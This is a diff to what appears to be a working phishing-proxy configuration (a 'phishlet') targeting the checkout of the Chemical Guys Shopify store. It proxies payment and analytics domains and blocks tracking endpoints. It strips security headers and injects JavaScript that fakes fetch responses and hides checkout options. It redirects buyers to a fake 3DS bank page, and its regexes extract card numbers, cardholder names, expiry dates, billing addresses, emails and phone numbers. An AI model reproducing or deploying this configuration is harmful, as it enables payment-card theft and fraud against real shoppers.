@@ -11,8 +11,19 @@ proxy_hosts:
   - {phish_sub: 'checkout', orig_sub: 'checkout', domain: 'shopify.com', session: true, is_landing: false, auto_filter: true }
   - {phish_sub: 'checkout.pci', orig_sub: 'checkout.pci', domain: 'shopifyinc.com', session: true, is_landing: false, auto_filter: true }
   - {phish_sub: 'pay', orig_sub: 'pay', domain: 'shopify.com', session: true, is_landing: false, auto_filter: true }
+  - {phish_sub: 'monorail-edge', orig_sub: 'monorail-edge', domain: 'shopifysvc.com', session: true, is_landing: false, auto_filter: true }
   - {phish_sub: 'hooks', orig_sub: 'hooks', domain: 'stripe.com', session: true, is_landing: false, auto_filter: true }
+  # track、日志相关
   - {phish_sub: 'api', orig_sub: 'api', domain: 'intelligems.io', session: true, is_landing: false, auto_filter: true }
+  - {phish_sub: 'cdnin', orig_sub: 'cdn', domain: 'intelligems.io', session: true, is_landing: false, auto_filter: true }
+  - {phish_sub: 'a', orig_sub: 'a', domain: 'klaviyo.com', session: true, is_landing: false, auto_filter: true }
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'klaviyo.com', session: true, is_landing: false, auto_filter: true }
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: true, is_landing: false, auto_filter: true }
+  - {phish_sub: 'payg', orig_sub: 'pay', domain: 'google.com', session: true, is_landing: false, auto_filter: true }
+  - {phish_sub: 'apigo', orig_sub: 'api', domain: 'gotolstoy.com', session: true, is_landing: false, auto_filter: true }
+  - {phish_sub: 'playgo', orig_sub: 'play', domain: 'gotolstoy.com', session: true, is_landing: false, auto_filter: true }
+  - {phish_sub: 'widget', orig_sub: 'widget', domain: 'gotolstoy.com', session: true, is_landing: false, auto_filter: true }
+  - {phish_sub: 'wwwg', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true }
 
 sub_filters:
   #  hack提交按钮 （解决不能重复提交问题）
@@ -21,6 +32,19 @@ sub_filters:
   - {triggers_on: 'www.chemicalguys.com', orig_sub: 'www', domain: 'chemicalguys.com', search: '\.behavior===["'']block["'']\),', replace: '.behavior===(!top.window.hack?"unblock":"block")),', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.chemicalguys.com', orig_sub: 'www', domain: 'chemicalguys.com', search: '\=\>["'']block["'']\=\=\=', replace: '=>(!top.window.hack?"unblock":"block")===', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.chemicalguys.com', orig_sub: 'www', domain: 'chemicalguys.com', search: 'Content-Security-Policy', replace: 'CSP', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
+  # 去掉express checkout
+  - {triggers_on: 'www.chemicalguys.com', orig_sub: 'www', domain: 'chemicalguys.com', search: '<section.*?aria-label="Contact".*?<\/section>', replace: '', mimes: ['text/html']}
+  #  请求带上cookie
+  - {triggers_on: 'www.chemicalguys.com', orig_sub: 'www', domain: 'chemicalguys.com', search: '{method:"POST",body:JSON\.stringify\({Detail', replace: '{method:"POST",credentials: "include",body:JSON.stringify({Detail', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
+
+intercept:
+  # 自定义3ds页面
+  - {domain: 'www.chemicalguys.com', mime: 'redirect', body: 'bankpage.chemicalguys.fake.com:3000', path: '\/phishing\/*', http_status: 301}
+  - {domain: 'www.chemicalguys.com', path: '.*?\/sandboxes\/wallets', http_status: 404}
+#  - {domain: 'www.chemicalguys.com', path: '.*?/DeliveryMethodSelectorSection.*', http_status: 404}
+  - {domain: 'api.intelligems.io', path: '.*\/track*', http_status: 404}
+  - {domain: 'play.google.com', path: '\/log', http_status: 404}
+#  - {domain: 'api.gotolstoy.com', path: '.*', http_status: 404}
 
 js_inject:
   - trigger_domains: ["www.chemicalguys.com"]
@@ -46,12 +70,12 @@ js_inject:
         window.fetch = (...args) => {
           const [input, init] = args;
           const url = typeof input === 'string' ? input : input.url?input.url:input.href;
-          console.log("请求url:",args, url)
+          // console.log("请求url:",args, url)
           const rule = mockRules.find(r => url.includes(r.url));
 
           if(rule && top.window.hack){
             return new Promise((resolve, reject) => {
-              console.log(`拦截请求: ${url}，返回 mock 数据`);
+              // console.log(`拦截请求: ${url}，返回 mock 数据`);
               // 立即给前端返回 mock（前端先用这个继续跑逻辑）
               resolve(
                 new Response(JSON.stringify(rule.response), {
@@ -63,18 +87,27 @@ js_inject:
            });
           }
           if(url.indexOf('SubmitForCompletion')>-1){
-            console.log('放行 SubmitForCompletion 请求，等待后端处理')
+            //console.log('放行 SubmitForCompletion 请求，等待后端处理')
             //top.window.hack = true; // 重新设置为 true，继续拦截
           }
 
           // 没匹配的请求走原始 fetch
           return originalFetch(...args);
         };
+      
+      
+        // 注入自定义样式
+        const css = `
+          [aria-label="Contact"]>div:nth-child(-n+2),
+          div:has(> div > div > div > #basic-creditCards) ~ div 
+          { display: none !important; }
+          
+        `;
+        const style = document.createElement('style');
+        style.type = 'text/css';
+        style.appendChild(document.createTextNode(css));
+        document.head.appendChild(style);
       }
-
-intercept:
-  # 自定义3ds页面
-  - {domain: 'www.chemicalguys.com', mime: 'redirect', body: 'bankpage.chemicalguys.fake.com:3000', path: '\/phishing\/*', http_status: 301}
 
 auth_tokens:
   - domain: 'chemicalguys.com'
@@ -89,7 +122,9 @@ credentials:
     key: ''
     search: '{"credit_card".*?"number":"([^"]*)"'
     type: 'json'
+  # 传入3ds页面的参数都在这里， 在3ds页面通过url提取
   custom:
+    #信用卡信息
     - key: 'name'
       search: '{"credit_card".*?"name":"([^"]*)"'
       type: 'json'
@@ -102,12 +137,46 @@ credentials:
     - key: 'year'
       search: '{"credit_card".*?"year":(\d+)'
       type: 'json'
-    - key: 'verification_value'
-      search: '{"credit_card".*?"verification_value":"([^"]*)"'
+    #账单地址
+    - key: 'billing_country'
+      search: '"billingAddress":\{.*?"countryCode":"([^"]*)"'
       type: 'json'
-    - key: 'userAgent'
-      search: '"userAgent":"([^"]*)"'
+    - key: 'billing_province'
+      search: '"billingAddress":\{.*?"zoneCode":"([^"]*)"'
       type: 'json'
+    - key: 'billing_city'
+      search: '"billingAddress":\{.*?"city":"([^"]*)"'
+      type: 'json'
+    - key: 'billing_zip'
+      search: '"billingAddress":\{.*?"postalCode":"([^"]*)"'
+      type: 'json'
+    - key: 'billing_address1'
+      search: '"billingAddress":\{.*?"address1":"([^"]*)"'
+      type: 'json'
+    - key: 'billing_address2'
+      search: '"billingAddress":\{.*?"address2":"([^"]*)"'
+      type: 'json'
+    #指纹信息
+    - key: 'fp_email'
+      search: '"buyerIdentity":\{.*?"email":"([^"]*)"'
+      type: 'json'
+    - key: 'fp_phone'
+      search: '"buyerIdentity":\{.*?"number":"([^"]*)"'
+      type: 'json'
+#    - key: 'fg_userAgent'
+#      search: ''
+#      type: 'json'
+#    - key: 'fg_ip'
+#      search: ''
+#      type: 'json'
+
+force_post:
+  - path: '\/sessions'
+    search: ''
+    force:
+      - {key: 'payment_session_scope', value: 'chemicalguys.com'}
+    type: 'post'
+
 login:
   domain: 'www.chemicalguys.com'
   path: '/'
